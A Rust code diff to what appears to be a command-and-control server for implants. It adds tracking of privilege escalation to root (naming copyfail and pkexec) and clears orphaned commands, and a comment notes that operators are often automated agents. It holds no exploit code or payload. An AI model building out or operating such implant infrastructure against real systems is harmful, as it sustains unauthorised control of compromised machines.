@@ -13,6 +13,14 @@ pub struct ListenerHandle {
     pub abort: tokio::sync::oneshot::Sender<()>,
 }
 
+/// Outcome of a session check-in — distinguishes a brand-new session from a
+/// privilege escalation (same session, uid became 0).
+pub enum SessionUpdate {
+    New,
+    Existing,
+    Escalated { from_uid: u32 },
+}
+
 pub struct AppState {
     /// All implant sessions keyed by implant_id.
     pub sessions: RwLock<HashMap<String, ImplantSession>>,
@@ -67,20 +75,93 @@ impl AppState {
     pub async fn ensure_session(
         &self, implant_id: &str, hostname: &str, ip: &str,
         tier: &str, os: &str, arch: &str, uid: u32, protocol_version: u32,
-    ) -> bool {
+    ) -> SessionUpdate {
         let mut sessions = self.sessions.write().await;
-        if sessions.contains_key(implant_id) {
-            let s = sessions.get_mut(implant_id).unwrap();
+        if let Some(s) = sessions.get_mut(implant_id) {
+            let prev_uid = s.uid;
             s.update_seen(ip.to_string());
             s.update_metadata(Some(os.to_string()), Some(arch.to_string()), Some(uid), Some(tier.to_string()));
-            false
+            // Privilege escalation: the same session (same implant_id) just
+            // checked in as root where it previously wasn't. This happens when
+            // privesc re-execs the implant as root (copyfail replaces the
+            // process image; pkexec spawns a root child and the parent exits).
+            // The pre-escalation process is gone, so any commands it was still
+            // holding (Sent, unresolved) are orphaned — resolve them so an
+            // operator (often an automated agent) isn't left polling forever.
+            if prev_uid != 0 && uid == 0 {
+                SessionUpdate::Escalated { from_uid: prev_uid }
+            } else {
+                SessionUpdate::Existing
+            }
         } else {
             let session = ImplantSession::new(
                 implant_id.to_string(), hostname.to_string(), ip.to_string(),
                 tier.to_string(), os.to_string(), arch.to_string(), uid, protocol_version,
             );
             sessions.insert(implant_id.to_string(), session);
-            true
+            SessionUpdate::New
+        }
+    }
+
+    /// Resolve the command bookkeeping after a session escalates to root.
+    ///
+    /// - Completes the outstanding `privesc` command (the one that triggered
+    ///   escalation) with a synthesized success result. Needed for copyfail,
+    ///   which replaces the process via execl before it can post a result.
+    /// - Marks any other `Sent` (delivered-but-unresolved) commands as
+    ///   `superseded_by_escalation` — the process that received them is gone,
+    ///   so they will never get real results.
+    ///
+    /// For pkexec this is a safe no-op in the common case: the unprivileged
+    /// parent posts its own results before exiting, so by the time the root
+    /// child triggers this, nothing is `Sent`. If a late parent result arrives
+    /// afterward, `store_result` overwrites the synthesized status — so real
+    /// results always win.
+    pub async fn resolve_escalation(&self, implant_id: &str, from_uid: u32) {
+        let mut history = self.command_history.write().await;
+        let entries = history.entry(implant_id.to_string()).or_insert_with(Vec::new);
+        let now = chrono::Utc::now();
+        let mut events: Vec<(String, String)> = Vec::new();
+
+        // Complete the most recent outstanding privesc command (reverse search).
+        for record in entries.iter_mut().rev() {
+            if record.status == CommandStatus::Sent && record.module == "privesc" {
+                record.status = CommandStatus::Completed;
+                record.completed_at = Some(now);
+                record.result = Some(serde_json::json!({
+                    "success": true,
+                    "escalated": true,
+                    "from_uid": from_uid,
+                    "new_uid": 0u32,
+                    "note": "session escalated to root; continuing under the same session id",
+                }));
+                events.push((record.id.clone(), "completed".into()));
+                break;
+            }
+        }
+
+        // Orphaned commands the pre-escalation process never resolved.
+        for record in entries.iter_mut() {
+            if record.status == CommandStatus::Sent {
+                record.status = CommandStatus::Failed;
+                record.completed_at = Some(now);
+                record.result = Some(serde_json::json!({
+                    "error": "superseded_by_escalation",
+                    "note": "process was replaced during privilege escalation; command did not complete",
+                }));
+                events.push((record.id.clone(), "failed".into()));
+            }
+        }
+
+        while entries.len() > MAX_COMMAND_HISTORY { entries.remove(0); }
+        drop(history);
+
+        for (command_id, status) in events {
+            let _ = self.event_tx.send(C2Event::CommandResult {
+                implant_id: implant_id.to_string(),
+                command_id,
+                status,
+            });
         }
     }
 
